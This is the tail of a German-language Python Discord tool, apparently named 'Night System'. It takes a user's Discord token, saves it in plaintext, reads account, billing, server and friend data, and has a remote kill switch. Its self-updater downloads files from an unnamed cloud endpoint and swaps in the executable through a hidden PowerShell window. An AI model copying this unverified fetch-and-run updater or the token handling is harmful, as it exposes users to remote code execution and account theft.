            cloud_info["lock_reason"] = lock_reason
            cloud_info["update_available"] = update_available
            cloud_info["latest_version"] = latest_version
            cloud_info["update_revision"] = update_revision
            cloud_info["download_url"] = ""
            cloud_info["announcement"] = announcement

            if is_locked:
                print(f"  [GESPERRT] {lock_reason}")
                sys.exit(1)
            else:
                print("  [*] Status: OK")

            # Manifest fuer dateigenaue Erkennung
            manifest_files_to_sync = []
            try:
                m_res = requests.get(f"{CLOUD_API_ENDPOINT}/manifest", timeout=6)
                if m_res.status_code == 200:
                    m_data = m_res.json()
                    server_files = m_data.get("files", [])
                    for s_file in server_files:
                        fn = s_file.get("name")
                        f_id = s_file.get("id")
                        s_hash = s_file.get("sha256")
                        if fn.endswith(".zip"):
                            continue

                        if fn in ("icon.ico", "logo.png"):
                            target_local = os.path.join(base_local_dir, "assets", fn)
                        else:
                            target_local = os.path.join(base_local_dir, fn)

                        need_update = False
                        if not os.path.exists(target_local):
                            if fn in ("README.md", "discord_settings.json"):
                                need_update = True
                        elif s_hash:
                            if fn == "discord_settings.json":
                                need_update = False
                            else:
                                try:
                                    with open(target_local, "rb") as tf:
                                        local_hash = hashlib.sha256(tf.read()).hexdigest()
                                    if local_hash != s_hash:
                                        need_update = True
                                except Exception:
                                    need_update = True

                        if need_update:
                            manifest_files_to_sync.append({
                                "name": fn,
                                "id": f_id,
                                "target": target_local,
                                "size": s_file.get("size", 0),
                                "is_py": fn == "ff.py",
                                "is_exe": fn.endswith(".exe")
                            })
            except Exception:
                pass

            has_update = (update_available or len(manifest_files_to_sync) > 0 or update_revision > local_revision or str(latest_version).strip() != str(local_version).strip())

            if has_update:
                print(f"  [UPDATE] Update verfügbar: v{latest_version} (Rev #{update_revision})")
                print("  [*] Lade Update herunter...")

                if not manifest_files_to_sync and last_file:
                    target_local = os.path.join(base_local_dir, last_file)
                    manifest_files_to_sync.append({
                        "name": last_file,
                        "id": f"discord_tool/{last_file}",
                        "target": target_local,
                        "size": 0,
                        "is_py": last_file == "ff.py",
                        "is_exe": last_file.endswith(".exe")
                    })

                total_items = max(1, len(manifest_files_to_sync))

                for idx, item in enumerate(manifest_files_to_sync, 1):
                    fn = item["name"]
                    fid = item["id"]
                    t_path = item["target"]

                    sys.stdout.write(f"  [*] Sync: {fn}... ")
                    sys.stdout.flush()

                    try:
                        os.makedirs(os.path.dirname(t_path), exist_ok=True)
                        file_url = f"{CLOUD_API_ENDPOINT}/file-content?id={fid}&download=1"
                        f_resp = requests.get(file_url, timeout=15)
                        if f_resp.status_code == 200:
                            if item["is_exe"] and getattr(sys, "frozen", False):
                                temp_exe = t_path + ".new"
                                with open(temp_exe, "wb") as out_f:
                                    out_f.write(f_resp.content)
                            else:
                                with open(t_path, "wb") as out_f:
                                    out_f.write(f_resp.content)
                            print("[OK]")
                        else:
                            print("[SKIP]")
                    except Exception as dl_err:
                        print(f"[FEHLER]")

                # Lokale settings.json aktualisieren
                try:
                    cur_settings = {}
                    if os.path.exists(settings_file):
                        with open(settings_file, "r", encoding="utf-8") as sf:
                            cur_settings = json.load(sf)
                    cur_settings["version"] = str(latest_version)
                    cur_settings["installed_revision"] = int(update_revision)
                    cur_settings["last_sync"] = datetime.now().strftime("%d.%m.%Y %H:%M:%S")
                    with open(settings_file, "w", encoding="utf-8") as sf:
                        json.dump(cur_settings, sf, indent=2)
                except Exception:
                    pass

                print(f"  [OK] Update auf v{latest_version} abgeschlossen! Starte neu...\n")
                time.sleep(0.5)

                if any(it.get("is_exe") for it in manifest_files_to_sync) and getattr(sys, "frozen", False):
                    exe_target = os.path.join(base_local_dir, "Nightheid.exe")
                    temp_exe = exe_target + ".new"
                    if os.path.exists(temp_exe):
                        ps_cmd = f"Start-Sleep -Milliseconds 700; Move-Item -Path '{temp_exe}' -Destination '{exe_target}' -Force; Start-Process -FilePath '{exe_target}'"
                        subprocess.Popen(
                            ["powershell", "-WindowStyle", "Hidden", "-NoProfile", "-Command", ps_cmd],
                            creationflags=0x08000000
                        )
                        sys.exit(0)
                elif any(it.get("is_py") for it in manifest_files_to_sync) and not getattr(sys, "frozen", False):
                    os.execv(sys.executable, [sys.executable] + sys.argv)
            else:
                pass

            if announcement:
                pass
    except Exception as ex:
        pass

    return cloud_info

# ==============================================================================
#  SETTINGS & PERSISTENCE HELPER FUNCTIONS
# ==============================================================================
def get_settings_path():
    base_local_dir = os.path.dirname(os.path.abspath(sys.argv[0])) if sys.argv and sys.argv[0] else os.getcwd()
    return os.path.join(base_local_dir, "discord_settings.json")

def load_saved_token():
    try:
        sp = get_settings_path()
        if os.path.exists(sp):
            with open(sp, "r", encoding="utf-8") as sf:
                cfg = json.load(sf)
                tok = cfg.get("saved_token") or cfg.get("token") or ""
                return str(tok).strip()
    except Exception:
        pass
    return ""

def save_user_token(token):
    try:
        sp = get_settings_path()
        cfg = {}
        if os.path.exists(sp):
            try:
                with open(sp, "r", encoding="utf-8") as sf:
                    cfg = json.load(sf)
            except Exception:
                cfg = {}
        cfg["saved_token"] = str(token).strip()
        with open(sp, "w", encoding="utf-8") as sf:
            json.dump(cfg, sf, indent=2)
    except Exception:
        pass

def clear_saved_token():
    try:
        sp = get_settings_path()
        if os.path.exists(sp):
            with open(sp, "r", encoding="utf-8") as sf:
                cfg = json.load(sf)
            cfg["saved_token"] = ""
            cfg["token"] = ""
            with open(sp, "w", encoding="utf-8") as sf:
                json.dump(cfg, sf, indent=2)
    except Exception:
        pass

# ==============================================================================
#  DISCORD ACCOUNT DATA LOADER
# ==============================================================================
def fetch_discord_account_data(token):
    token = (token or "").strip()
    if (token.startswith('"') and token.endswith('"')) or (token.startswith("'") and token.endswith("'")):
        token = token[1:-1].strip()

    if not token:
        return False, None, None, None, None, None, None, "Bitte gib einen gültigen Discord Token ein."

    if token.lower() == "demo":
        return True, DEMO_DATA["user"], DEMO_DATA["connections"], DEMO_DATA["guilds"], DEMO_DATA["billing"], DEMO_DATA["friends"], DEMO_DATA["user_to_channel_map"], ""

    headers = {"Authorization": token}
    try:
        r = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=8)
        if r.status_code != 200:
            return False, None, None, None, None, None, None, f"Ungültiger Discord Token (Status {r.status_code}). Bitte überprüfe deinen Token!"
        user_data = r.json()

        try:
            rc = requests.get("https://discord.com/api/v10/users/@me/connections", headers=headers, timeout=5)
            connections_data = rc.json() if rc.status_code == 200 else []
        except Exception:
            connections_data = []

        try:
            rg = requests.get("https://discord.com/api/v10/users/@me/guilds", headers=headers, timeout=5)
            guilds_data = rg.json() if rg.status_code == 200 else []
        except Exception:
            guilds_data = []

        try:
            rb = requests.get("https://discord.com/api/v10/users/@me/billing/payment-sources", headers=headers, timeout=5)
            billing_data = rb.json() if rb.status_code == 200 else []
        except Exception:
            billing_data = []

        fresh_f = []
        user_to_channel_map = {}
        try:
            rf = requests.get("https://discord.com/api/v10/users/@me/relationships", headers=headers, timeout=5)
            if rf.status_code == 200:
                for item in rf.json():
                    u_info = item.get("user", {})
                    fresh_f.append({
                        "id": str(item.get("id", u_info.get("id"))),
                        "name": u_info.get("global_name") or u_info.get("username", "Freund"),
                        "username": u_info.get("username", ""),
                        "type_name": "Freund" if item.get("type") == 1 else ("Anfrage" if item.get("type") in (3, 4) else "Blockiert"),
                        "is_group": False
                    })
            rc = requests.get("https://discord.com/api/v10/users/@me/channels", headers=headers, timeout=5)
            if rc.status_code == 200:
                for ch in rc.json():
                    ch_type = ch.get("type")
                    recips = ch.get("recipients", [])
                    recip_names = ", ".join([rcp.get("username", "") for rcp in recips[:3]])
                    if ch_type == 3:
                        g_name = ch.get("name") or (f"Gruppe ({recip_names})" if recip_names else "Gruppe")
                        fresh_f.append({
                            "id": str(ch.get("id")),
                            "name": g_name,
                            "username": f"{len(recips)} Mitglieder",
                            "type_name": "Gruppe",
                            "is_group": True
                        })
                    elif ch_type == 1 and recips:
                        dm_uid = str(recips[0].get("id"))
                        user_to_channel_map[dm_uid] = str(ch.get("id"))
                        if not any(f["id"] == dm_uid for f in fresh_f):
                            fresh_f.append({
                                "id": str(ch.get("id")),
                                "name": recips[0].get("global_name") or recips[0].get("username", "DM"),
                                "username": recips[0].get("username", ""),
                                "type_name": "DM",
                                "is_group": True
                            })
            friends_data = fresh_f
        except Exception:
            friends_data = []

        return True, user_data, connections_data, guilds_data, billing_data, friends_data, user_to_channel_map, ""
    except Exception as e:
        return False, None, None, None, None, None, None, f"Verbindungsfehler zur Discord API: {e}"

# ==============================================================================
#  TERMINAL VALIDATOR & PROGRESS LOADER (CMD OHNE LOGIN-UI)
# ==============================================================================
def validate_and_load_in_terminal(preset_token=None):
    try:
        import ctypes
        ctypes.windll.kernel32.SetConsoleTitleW("Night System - Discord Engine")
        ctypes.windll.kernel32.SetConsoleOutputCP(65001)
        ctypes.windll.kernel32.SetConsoleCP(65001)
    except Exception:
        pass

    if os.name == "nt":
        os.system("color")
        os.system("cls")
    else:
        os.system("clear")

    cloud_info = check_cloud_status_and_update()

    token = ""
    user_data = {}
    connections_data = []
    guilds_data = []
    billing_data = []
    friends_data = []
    user_to_channel_map = {}

    # 1. Gespeicherten Token oder CLI-Preset ueberpruefen
    if preset_token:
        token = preset_token.strip()
    else:
        saved = load_saved_token()
        if saved:
            print("  [*] Prüfe gespeicherten Token...")
            ok, u_data, c_data, g_data, b_data, f_data, u_ch_map, err = fetch_discord_account_data(saved)
            if ok:
                user_data = u_data
                connections_data = c_data
                guilds_data = g_data
                billing_data = b_data
                friends_data = f_data
                user_to_channel_map = u_ch_map
                token = saved
                print(f"  [OK] Eingeloggt als @{user_data.get('username')}")
            else:
                print("  [FEHLER] Gespeicherter Token ungültig.")
                clear_saved_token()
                token = ""

    # 2. Wenn kein gueltiger Token vorhanden: Eingabe direkt im Terminal / CMD
    if not token:
        print("  [AUTH] Discord Token eingeben:")
        while True:
            try:
                entered = input("  Token: ").strip()
            except (EOFError, KeyboardInterrupt):
                sys.exit(0)

            if (entered.startswith('"') and entered.endswith('"')) or (entered.startswith("'") and entered.endswith("'")):
                entered = entered[1:-1].strip()

            if not entered:
                continue

            print("  [*] Prüfe Token...")
            ok, u_data, c_data, g_data, b_data, f_data, u_ch_map, err = fetch_discord_account_data(entered)
            if ok:
                user_data = u_data
                connections_data = c_data
                guilds_data = g_data
                billing_data = b_data
                friends_data = f_data
                user_to_channel_map = u_ch_map
                token = entered
                print(f"  [OK] Eingeloggt als @{user_data.get('username')}")
                if token.lower() != "demo":
                    save_user_token(token)
                break
            else:
                print("  [FEHLER] Token ungültig. Bitte erneut versuchen.")

    # 3. Kurzer Start
    print("  [*] Starte Benutzeroberfläche...")
    time.sleep(0.2)

    return user_data, connections_data, guilds_data, billing_data, friends_data, user_to_channel_map, token, cloud_info


# ==============================================================================
#  CMD INTERACTIVE LISTENER
# ==============================================================================
def start_cmd_listener(app):
    def _cmd_worker():
        time.sleep(0.5)
        print("\n  [CMD BEREIT] Befehle: status | token <token> | update | logout | cls | exit")
        while True:
            try:
                line = sys.stdin.readline()
                if not line:
                    break
                cmd_line = line.strip()
                if not cmd_line:
                    continue

                parts = cmd_line.split(maxsplit=1)
                cmd = parts[0].lower()
                arg = parts[1].strip() if len(parts) > 1 else ""

                if cmd in ("exit", "quit", "q"):
                    print("  [*] Beende Programm...")
                    try:
                        app.after(0, app.destroy)
                    except Exception:
                        pass
                    sys.exit(0)

                elif cmd in ("cls", "clear"):
                    os.system("cls" if os.name == "nt" else "clear")
                    print(f"  [Night System v{DISCORD_TOOL_VERSION}] Eingeloggt als @{app.user_data.get('username', 'Benutzer')}")
                    print("  [CMD BEREIT] Befehle: status | token <token> | update | logout | cls | exit")

                elif cmd == "status":
                    uname = app.user_data.get('username', 'Unbekannt')
                    g_count = len(app.guilds_data)
                    f_count = len(app.friends_data)
                    bot_status = "Aktiv" if getattr(app, "bot_active", False) else "Inaktiv"
                    print(f"  [STATUS] User: @{uname} | Server: {g_count} | Freunde: {f_count} | Bot: {bot_status} | v{DISCORD_TOOL_VERSION}")

                elif cmd == "token":
                    new_tok = arg.strip()
                    if not new_tok:
                        print("  [HINWEIS] Verwendung: token <dein_discord_token>")
                    else:
                        print("  [*] Prüfe neuen Token...")
                        ok, u_data, c_data, g_data, b_data, f_data, u_ch_map, err = fetch_discord_account_data(new_tok)
                        if ok:
                            save_user_token(new_tok)
                            print(f"  [OK] Token gültig! Eingeloggt als @{u_data.get('username')}. Starte neu...")
                            try:
                                app.after(0, app.destroy)
                            except Exception:
                                pass
                            if getattr(sys, "frozen", False):
                                base_dir = os.path.dirname(os.path.abspath(sys.argv[0])) if sys.argv and sys.argv[0] else os.getcwd()
                                exe_path = os.path.join(base_dir, "Nightheid.exe")
                                subprocess.Popen([exe_path])
                            else:
                                subprocess.Popen([sys.executable, sys.argv[0]])
                            sys.exit(0)
                        else:
                            print(f"  [FEHLER] Ungültiger Token: {err}")

                elif cmd == "logout":
                    print("  [*] Logge aus und starte Token-Eingabe neu...")
                    app.after(0, app.logout_and_switch_token)
                    break

                elif cmd == "update":
                    print("  [*] Suche nach Updates...")
                    c_info = check_cloud_status_and_update()
                    if not c_info.get("update_available"):
                        print(f"  [OK] Keine Updates vorhanden. Aktuell: v{DISCORD_TOOL_VERSION}")

                elif cmd in ("help", "?"):
                    print("  [BEFEHLE] status | token <token> | update | logout | cls | exit")

                else:
                    if len(cmd_line) > 30 and ("." in cmd_line or cmd_line.lower() == "demo"):
                        print("  [*] Token erkannt! Prüfe...")
                        ok, u_data, c_data, g_data, b_data, f_data, u_ch_map, err = fetch_discord_account_data(cmd_line)
                        if ok:
                            save_user_token(cmd_line)
                            print(f"  [OK] Token gültig! Eingeloggt als @{u_data.get('username')}. Starte neu...")
                            try:
                                app.after(0, app.destroy)
                            except Exception:
                                pass
                            if getattr(sys, "frozen", False):
                                base_dir = os.path.dirname(os.path.abspath(sys.argv[0])) if sys.argv and sys.argv[0] else os.getcwd()
                                exe_path = os.path.join(base_dir, "Nightheid.exe")
                                subprocess.Popen([exe_path])
                            else:
                                subprocess.Popen([sys.executable, sys.argv[0]])
                            sys.exit(0)
                        else:
                            print("  [FEHLER] Ungültiger Token.")
                    else:
                        print(f"  [INFO] Unbekannter Befehl '{cmd}'. Tippe 'help' für Hilfe.")

            except Exception:
                pass

    t = threading.Thread(target=_cmd_worker, daemon=True)
    t.start()


# ==============================================================================
#  MAIN ENTRY POINT (CMD START • KEINE LOGIN-UI)
# ==============================================================================
if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--browser":
        t = sys.argv[2] if len(sys.argv) > 2 else ""
        u = sys.argv[3] if len(sys.argv) > 3 else ""
        run_browser_session(t, u)
        sys.exit(0)
    elif len(sys.argv) > 1 and sys.argv[1] == "--token":
        t = sys.argv[2] if len(sys.argv) > 2 else ""
        u_data, c_data, g_data, b_data, f_data, u_ch_map, active_token, c_info = validate_and_load_in_terminal(preset_token=t)
        app = App(
            user_data=u_data,
            connections_data=c_data,
            guilds_data=g_data,
            billing_data=b_data,
            friends_data=f_data,
            user_to_channel_map=u_ch_map,
            token=active_token,
            cloud_info=c_info
        )
        start_cmd_listener(app)
        app.mainloop()
    else:
        u_data, c_data, g_data, b_data, f_data, u_ch_map, active_token, c_info = validate_and_load_in_terminal()
        app = App(
            user_data=u_data,
            connections_data=c_data,
            guilds_data=g_data,
            billing_data=b_data,
            friends_data=f_data,
            user_to_channel_map=u_ch_map,
            token=active_token,
            cloud_info=c_info
        )
        start_cmd_listener(app)
        app.mainloop()

